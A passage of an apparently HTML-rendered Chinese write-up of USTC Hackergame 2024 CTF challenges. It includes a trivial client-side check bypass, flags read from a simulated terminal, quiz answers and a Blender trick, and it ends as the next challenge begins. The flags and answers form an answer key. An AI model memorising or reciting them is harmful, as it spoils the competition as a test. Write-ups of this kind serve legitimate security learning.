+<span class="md-nav__icon md-icon"></span>
+            GameDev
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../gamedev/ai/index.html">
+<span class="md-ellipsis">
+    AI
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_2">
+<span class="md-nav__icon md-icon"></span>
+            AI
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6_2_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../gamedev/ai/sd/index.html">
+<span class="md-ellipsis">
+    Stable Diffusion
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_2_2_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_6_2_2">
+<span class="md-nav__icon md-icon"></span>
+            Stable Diffusion
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_7" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../blog/index.html">
+<span class="md-ellipsis">
+    Blog
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_7_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_7">
+<span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_7_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_7_2" id="__nav_7_2_label" tabindex="0">
+<span class="md-ellipsis">
+    归档
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_7_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_7_2">
+<span class="md-nav__icon md-icon"></span>
+            归档
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/archive/2025.html">
+<span class="md-ellipsis">
+    2025
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/archive/2024.html">
+<span class="md-ellipsis">
+    2024
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_7_3" type="checkbox"/>
+<label class="md-nav__link" for="__nav_7_3" id="__nav_7_3_label" tabindex="0">
+<span class="md-ellipsis">
+    分类
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_7_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_7_3">
+<span class="md-nav__icon md-icon"></span>
+            分类
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/category/cve-roulette.html">
+<span class="md-ellipsis">
+    CVE Roulette
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/category/chaos.html">
+<span class="md-ellipsis">
+    Chaos
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/category/hackerrank.html">
+<span class="md-ellipsis">
+    HackerRank
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/category/programming-language.html">
+<span class="md-ellipsis">
+    Programming Language
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/category/random-ramblings.html">
+<span class="md-ellipsis">
+    Random Ramblings
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../blog/category/scientific-witchery.html">
+<span class="md-ellipsis">
+    Scientific Witchery
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="目录" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web">
+<span class="md-ellipsis">
+            [Web] 签到
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web-ctfer">
+<span class="md-ellipsis">
+            [Web] 喜欢做签到的 CTFer 你们好呀
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[Web] 喜欢做签到的 CTFer 你们好呀" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general-hackergame">
+<span class="md-ellipsis">
+            [General] 猫咪问答（Hackergame 十周年纪念版）
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] 猫咪问答（Hackergame 十周年纪念版）" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general">
+<span class="md-ellipsis">
+            [General] 打不开的盒
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general_1">
+<span class="md-ellipsis">
+            [General] 每日论文太多了！
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web_1">
+<span class="md-ellipsis">
+            [Web] 比大小王
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[Web] 比大小王" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general-40">
+<span class="md-ellipsis">
+            [General] 旅行照片 4.0
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] 旅行照片 4.0" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general_2">
+<span class="md-ellipsis">
+            [General] 不宽的宽字符
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] 不宽的宽字符" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general-powerfulshell">
+<span class="md-ellipsis">
+            [General] PowerfulShell
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] PowerfulShell" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web-nodejs-is-web-scale">
+<span class="md-ellipsis">
+            [Web] Node.js is Web Scale
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web-paolugpt">
+<span class="md-ellipsis">
+            [Web] PaoluGPT
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[Web] PaoluGPT" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#other">
+<span class="md-ellipsis">
+            Other...
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="ustc-hackergame-2024">USTC Hackergame 2024<a class="headerlink" href="#ustc-hackergame-2024" title="Permanent link">¶</a></h1>
+<div class="admonition abstract">
+<p class="admonition-title"><a href="https://hack.lug.ustc.edu.cn/">USTC Hackergame 2024</a></p>
+<ul>
+<li><strong>比赛平台</strong> : <a href="https://hack.lug.ustc.edu.cn/">hack.lug.ustc.edu.cn</a></li>
+<li><strong>比赛时间</strong> : 2024-11-02 12:00:00 - 2024-11-09 12:00:00 UTC+8</li>
+<li><strong>官方仓库</strong> : <a href="https://github.com/USTC-Hackergame/hackergame2024-writeups">github.com/USTC-Hackergame/hackergame2024-writeups</a></li>
+<li><strong>题解仓库</strong> : <a href="https://github.com/13m0n4de/hackergame2024-writeups">github.com/13m0n4de/hackergame2024-writeups</a></li>
+</ul>
+</div>
+<h2 id="web"><span>[Web]<span class="heti-spacing"> </span></span>签到<a class="headerlink" href="#web" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<p>如网页源码所示，填写错误时会跳转到 <code>/pass?=false</code>，正确时会跳转到 <code>/pass?=true</code>。</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">submitResult</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">inputs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">'.input-box'</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">allCorrect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">inputs</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">input</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="nx">answers</span><span class="p">[</span><span class="nx">input</span><span class="p">.</span><span class="nx">id</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">allCorrect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">input</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">'wrong'</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">input</span><span class="p">.</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">'correct'</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">});</span>
+
+<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`?pass=</span><span class="si">${</span><span class="nx">allCorrect</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>所以直接在地址栏修改 <code>pass</code> 参数为 <code>true</code> 或手动发送<span class="heti-skip"><span class="heti-spacing"> </span>GET<span class="heti-spacing"> </span></span>请求就好：</p>
+<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/?pass=true</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+<h2 id="web-ctfer"><span>[Web]<span class="heti-spacing"> </span></span>喜欢做签到的<span class="heti-skip"><span class="heti-spacing"> </span>CTFer<span class="heti-spacing"> </span></span>你们好呀<a class="headerlink" href="#web-ctfer" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<p>「藏在中国科学技术大学校内<span class="heti-skip"><span class="heti-spacing"> </span>CTF<span class="heti-spacing"> </span></span>战队的招新主页<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，我是先是用「USTC」作关键字搜到了<span class="heti-skip"><span class="heti-spacing"> </span>CTF Time<span class="heti-spacing"> </span></span>上的战队主页，然后才找到主页地址。</p>
+<ul>
+<li><a href="https://ctftime.org/team/168863/">https://ctftime.org/team/168863/</a></li>
+<li><a href="https://www.nebuu.la/">https://www.nebuu.la/</a></li>
+</ul>
+<p>结果比赛主页的承办单位居然就有，眼神不太好使……</p>
+<p>网站打开是一个终端，可以输入一些命令。</p>
+<p>需要注意的是所有命令都是预设好的效果，能不能和终端命令行下产生同样效果，要看代码如何写。比如 <code>ls</code> 其实没法列出指定文件夹内容。</p>
+<p>第一个<span class="heti-skip"><span class="heti-spacing"> </span>Flag<span class="heti-spacing"> </span></span>在 <code>env</code> 命令结果中，这个命令可以列出环境变量：</p>
+<div class="highlight"><pre><span></span><code>ctfer@ustc-nebula:$ ~ env
+PWD=/root/Nebula-Homepage
+ARCH=loong-arch
+NAME=Nebula-Dedicated-High-Performance-Workstation
+OS=NixOS❄️
+FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
+REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
+</code></pre></div>
+<p>第二个<span class="heti-skip"><span class="heti-spacing"> </span>Flag<span class="heti-spacing"> </span></span>在隐藏文件 <code>.flag</code> 中：</p>
+<div class="highlight"><pre><span></span><code>ctfer@ustc-nebula:$ ~ ls -la
+.flag
+.oh-you-found-it/
+Awards
+Members
+Welcome-to-USTC-Nebula-s-Homepage/
+and-We-are-Waiting-for-U/
+
+ctfer@ustc-nebula:$ ~ cat .flag
+flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}
+</code></pre></div>
+<h3 id="_1">其他<a class="headerlink" href="#_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>终端很熟悉，用的是<a href="https://github.com/m4tt72/terminal"><span><span class="heti-spacing"> </span>m4tt72/terminal</span></a>，前两年我也把它用在工作室招新考核主页了。</p>
+<p>这个终端不好复制的问题依然在，要么选中时不松手<span><span class="heti-spacing"> </span>CTRL+C</span>，要么审查元素。</p>
+<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/web/%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84%20CTFer%20%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80/images/px_page1.png"><img alt="px_page1" src="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/web/%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84%20CTFer%20%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80/images/px_page1.png"/></a>
+<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/web/%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84%20CTFer%20%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80/images/px_page2.png"><img alt="px_page2" src="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/web/%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84%20CTFer%20%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80/images/px_page2.png"/></a></p>
+<p>死去的回忆开始攻击我。</p>
+<p><del>继<a href="https://github.com/SVUCTF/SVUCTF-HELLOWORLD-2023/blob/main/challenges/web/non_pressable_button/README.md">原神，启动！</a>以来，又一<span class="heti-skip"><span class="heti-spacing"> </span>HG<span class="heti-spacing"> </span></span>抄袭我们野鸡比赛的力证。</del></p>
+<p>心脏滴血的<span class="heti-skip"><span class="heti-spacing"> </span>ASCII Art<span class="heti-spacing"> </span></span>真好看。</p>
+<h2 id="general-hackergame"><span>[General]<span class="heti-spacing"> </span></span>猫咪问答（<span>Hackergame<span class="heti-spacing"> </span></span>十周年纪念版）<a class="headerlink" href="#general-hackergame" title="Permanent link">¶</a></h2>
+<h3 id="q1">Q1<a class="headerlink" href="#q1" title="Permanent link">¶</a></h3>
+<blockquote>
+<p><span>1.<span class="heti-spacing"> </span></span>在<span class="heti-skip"><span class="heti-spacing"> </span>Hackergame 2015<span class="heti-spacing"> </span></span>比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（<span>30<span class="heti-spacing"> </span></span>分）</p>
+<p>提示：填写教室编号，如<span><span class="heti-spacing"> </span>5207</span>、3A101。</p>
+</blockquote>
+<p>在中国科学技术大学<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>用户协会的<a href="https://lug.ustc.edu.cn/wiki/lug/events/hackergame/">活动页面</a>找到关于<span class="heti-skip"><span class="heti-spacing"> </span>Hackergame<span class="heti-spacing"> </span></span>的活动记录。</p>
+<p>第三届<span class="heti-skip"><span class="heti-spacing"> </span>2016<span class="heti-spacing"> </span></span>年的链接已失效，第二届<span class="heti-skip"><span class="heti-spacing"> </span>2015<span class="heti-spacing"> </span></span>年的链接存档在：<a href="https://lug.ustc.edu.cn/wiki/sec/contest.html">https://lug.ustc.edu.cn/wiki/sec/contest.html</a></p>
+<p>比赛时间安排中找到「3A204」教室。</p>
+<p>答案：<code>3A204</code></p>
+<h3 id="q2">Q2<a class="headerlink" href="#q2" title="Permanent link">¶</a></h3>
+<blockquote>
+<p><span>2.<span class="heti-spacing"> </span></span>众所周知，<span>Hackergame<span class="heti-spacing"> </span></span>共约<span class="heti-skip"><span class="heti-spacing"> </span>25<span class="heti-spacing"> </span></span>道题目。近五年（不含今年）举办的<span class="heti-skip"><span class="heti-spacing"> </span>Hackergame<span class="heti-spacing"> </span></span>中，题目数量最接近这个数字的那一届比赛里有多少人注册参加<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（<span>30<span class="heti-spacing"> </span></span>分）</p>
+<p>提示：是一个非负整数。</p>
+</blockquote>
+<p>我是挨个看了往届比赛的题解仓库，找到每一届的题目数量：</p>
+<ul>
+<li>2023: 29</li>
+<li>2022: 33</li>
+<li>2021: 31</li>
+<li>2020: 31</li>
+<li>2019: 28</li>
+</ul>
+<p>最靠近<span class="heti-skip"><span class="heti-spacing"> </span>25<span class="heti-spacing"> </span></span>的是<span class="heti-skip"><span class="heti-spacing"> </span>2019<span class="heti-spacing"> </span></span>年的比赛，找到赛事相关新闻页面：<a href="https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/">https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/</a></p>
+<p>在新闻页面上发现有「2682」人注册。</p>
+<p>答案：<code>2682</code></p>
+<h3 id="q3">Q3<a class="headerlink" href="#q3" title="Permanent link">¶</a></h3>
+<blockquote>
+<p><span>3. Hackergame 2018<span class="heti-spacing"> </span></span>让哪个热门检索词成为了科大图书馆当月热搜第一<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（<span>20<span class="heti-spacing"> </span></span>分）</p>
+<p>提示：仅由中文汉字构成。</p>
+</blockquote>
+<p>又是检索又是图书馆的，那肯定是问答题带来的热门检索了。</p>
+<p>于是翻看<a href="https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md"><span class="heti-skip"><span class="heti-spacing"> </span>Hackergame 2018<span class="heti-spacing"> </span></span>猫咪问答题解</a>，有一题：</p>
+<blockquote>
+<p>在中国科大图书馆中，有一本书叫做《程序员的自我修养<span class="heti-skip"><span class="heti-spacing"> </span>:<span class="heti-spacing"> </span></span>链接、装载与库<heti-adjacent class="heti-adjacent-half">》</heti-adjacent>，请问它的索书号是？</p>
+<p>打开中国科大图书馆主页，直接搜索“程序员的自我修养”即可。</p>
+</blockquote>
+<p>那么答案就是「程序员的自我修养<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
+<p>但准确信息是在<a href="https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md">花絮</a>里。</p>
+<p>答案：<code>程序员的自我修养</code></p>
+<h3 id="q4">Q4<a class="headerlink" href="#q4" title="Permanent link">¶</a></h3>
+<blockquote>
+<p><span>4.<span class="heti-spacing"> </span></span>在今年的<span class="heti-skip"><span class="heti-spacing"> </span>USENIX Security<span class="heti-spacing"> </span></span>学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了<span class="heti-skip"><span class="heti-spacing"> </span>6<span class="heti-spacing"> </span></span>种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（<span>10<span class="heti-spacing"> </span></span>分）</p>
+<p>提示：是一个非负整数。</p>
+</blockquote>
+<p>在<a href="https://www.usenix.org/"><span class="heti-skip"><span class="heti-spacing"> </span>USENIX Security<span class="heti-spacing"> </span></span></a>官网搜索「email<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，得到论文名称：</p>
+<p>「FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechanism in Email Systems」</p>
+<p>在 <a href="https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf">论文<span class="heti-skip"><span class="heti-spacing"> </span>PDF<span class="heti-spacing"> </span></span></a>第<span class="heti-skip"><span class="heti-spacing"> </span>6<span class="heti-spacing"> </span></span>节 <em>Imperceptible Email Spoofing Attack</em>：</p>
+<blockquote>
+<p>Con-sequently, we propose six types of email spoofing attacks and measure their impact across 16 email services and 20 clients. All 20 clients are configured as MUAs for all 16 providers via IMAP, resulting in <strong>336</strong> combinations (including 16 web interfaces of target providers)</p>
+</blockquote>
+<p>答案：<code>336</code></p>
+<h3 id="q5">Q5<a class="headerlink" href="#q5" title="Permanent link">¶</a></h3>
+<blockquote>
+<p><span>5. 10<span class="heti-spacing"> </span></span>月<span class="heti-skip"><span class="heti-spacing"> </span>18<span class="heti-spacing"> </span></span>日<span class="heti-skip"><span class="heti-spacing"> </span>Greg Kroah-Hartman<span class="heti-spacing"> </span></span>向<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>邮件列表提交的一个<span class="heti-skip"><span class="heti-spacing"> </span>patch<span class="heti-spacing"> </span></span>把大量开发者从<span class="heti-skip"><span class="heti-spacing"> </span>MAINTAINERS<span class="heti-spacing"> </span></span>文件中移除。这个<span class="heti-skip"><span class="heti-spacing"> </span>patch<span class="heti-spacing"> </span></span>被合并进<span class="heti-skip"><span class="heti-spacing"> </span>Linux mainline<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>commit id<span class="heti-spacing"> </span></span>是多少<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（<span>5<span class="heti-spacing"> </span></span>分）</p>
+<p>提示：<span>id<span class="heti-spacing"> </span></span>前<span class="heti-skip"><span class="heti-spacing"> </span>6<span class="heti-spacing"> </span></span>位，字母小写，如<span><span class="heti-spacing"> </span>c1e939</span>。</p>
+</blockquote>
+<p>足够争议性的话题，国内外媒体新闻漫天飞，相关信息挺多，但大多是指向<span class="heti-skip"><span class="heti-spacing"> </span>patch<span class="heti-spacing"> </span></span>的链接，不是合并。</p>
+<p>在<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>内核的<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git">官方<span class="heti-skip"><span class="heti-spacing"> </span>Git<span class="heti-spacing"> </span></span>仓库</a>上搜索作者「Greg Kroah-Hartman<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，可以得到删除<span class="heti-skip"><span class="heti-spacing"> </span>MAINTAINERS<span class="heti-spacing"> </span></span>的<span><span class="heti-spacing"> </span>commit</span>：</p>
+<p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e90b675cf942e50c70e8394dfb5862975c3b3b2">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e90b675cf942e50c70e8394dfb5862975c3b3b2</a></p>
+<p>答案：<code>6e90b6</code></p>
+<h3 id="q6">Q6<a class="headerlink" href="#q6" title="Permanent link">¶</a></h3>
+<blockquote>
+<p><span>6.<span class="heti-spacing"> </span></span>大语言模型会把输入分解为一个一个的<span class="heti-skip"><span class="heti-spacing"> </span>token<span class="heti-spacing"> </span></span>后继续计算，请问这个网页的<span class="heti-skip"><span class="heti-spacing"> </span>HTML<span class="heti-spacing"> </span></span>源代码会被<span class="heti-skip"><span class="heti-spacing"> </span>Meta<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>Llama 3 70B<span class="heti-spacing"> </span></span>模型的<span class="heti-skip"><span class="heti-spacing"> </span>tokenizer<span class="heti-spacing"> </span></span>分解为多少个<span><span class="heti-spacing"> </span>token</span><heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（<span>5<span class="heti-spacing"> </span></span>分）</p>
+<p>提示：首次打开本页时的<span class="heti-skip"><span class="heti-spacing"> </span>HTML<span class="heti-spacing"> </span></span>源代码，答案是一个非负整数</p>
+</blockquote>
+<p>要用<span class="heti-skip"><span class="heti-spacing"> </span>Llama 3 70B<span class="heti-spacing"> </span></span>的<span><span class="heti-spacing"> </span>Tokenizer</span>，需要在<a href="https://huggingface.co/meta-llama/Meta-Llama-3-70B"><span class="heti-skip"><span class="heti-spacing"> </span>HuggingFace<span class="heti-spacing"> </span></span>仓库</a> 向<span class="heti-skip"><span class="heti-spacing"> </span>Meta<span class="heti-spacing"> </span></span>申请访问权限，比赛时没想着等，找了在线的<span><span class="heti-spacing"> </span>Tokenizer</span>：</p>
+<ul>
+<li><a href="https://tiktokenizer.vercel.app/?model=meta-llama%2FMeta-Llama-3-70B">https://tiktokenizer.vercel.app/?model=meta-llama%2FMeta-Llama-3-70B</a></li>
+<li><a href="https://lunary.ai/llama3-tokenizer">https://lunary.ai/llama3-tokenizer</a></li>
+</ul>
+<p>得到的结果会上下浮动，有条件还是获得个访问权限，然后只使用<span><span class="heti-spacing"> </span>Tokenizer</span>：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">transformers</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">token</span> <span class="o">=</span> <span class="s2">"&lt;your_token&gt;"</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+    <span class="s2">"http://202.38.93.141:13030/"</span><span class="p">,</span>
+    <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">"token"</span><span class="p">:</span> <span class="n">token</span><span class="p">},</span>
+<span class="p">)</span>
+
+<span class="n">tokenizer</span> <span class="o">=</span> <span class="n">transformers</span><span class="o">.</span><span class="n">AutoTokenizer</span><span class="o">.</span><span class="n">from_pretrained</span><span class="p">(</span><span class="s2">"meta-llama/Meta-Llama-3-70B"</span><span class="p">)</span>
+<span class="n">tokens</span> <span class="o">=</span> <span class="n">tokenizer</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">tokens</span><span class="p">))</span>
+</code></pre></div>
+<p>可能是带有<span class="heti-skip"><span class="heti-spacing"> </span>BOS Token<span class="heti-spacing"> </span></span>或者<span><span class="heti-spacing"> </span>EOS Token</span>，我的代码得到结果是「1835<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，正确答案为「1833<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
+<p>答案：<code>1833</code></p>
+<p><del>看了一些别人的题解，都是哪来的钱哪来的机器，<span>70B<span class="heti-spacing"> </span></span>模型说跑就跑啊</del></p>
+<h2 id="general"><span>[General]<span class="heti-spacing"> </span></span>打不开的盒<a class="headerlink" href="#general" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<p><span>STL<span class="heti-spacing"> </span></span>文件导入<span><span class="heti-spacing"> </span>Blender</span>，进入编辑模式，透视框选删除上半部分全部的边和面，就可以看到<span class="heti-skip"><span class="heti-spacing"> </span>Flag<span class="heti-spacing"> </span></span>了：</p>
+<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92/images/blender.png"><img alt="blender" src="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92/images/blender.png"/></a></p>
+<p>比伸个摄像头进去看清晰得多。</p>
+<h2 id="general_1"><span>[General]<span class="heti-spacing"> </span></span>每日论文太多了！<a class="headerlink" href="#general_1" title="Permanent link">¶</a></h2>
